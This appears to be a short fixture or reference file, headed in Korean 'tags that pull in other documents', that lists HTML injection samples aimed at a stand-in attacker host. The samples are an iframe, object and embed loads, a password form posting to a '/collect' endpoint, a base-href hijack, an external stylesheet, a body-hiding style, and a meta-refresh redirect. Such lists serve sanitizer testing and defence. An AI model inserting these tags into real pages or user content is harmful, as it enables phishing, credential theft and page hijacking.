---
id: DOC-H3
type: guide
---

# 다른 문서를 끌어오는 태그

<iframe src="https://attacker.example/steal"></iframe>

<object data="https://attacker.example/x.swf"></object>

<embed src="https://attacker.example/x.swf">

<form action="https://attacker.example/collect" method="post">
  <input name="password" type="password">
  <button type="submit">보내기</button>
</form>

<base href="https://attacker.example/">

<link rel="stylesheet" href="https://attacker.example/x.css">

<style>body { display: none }</style>

<meta http-equiv="refresh" content="0;url=https://attacker.example/">
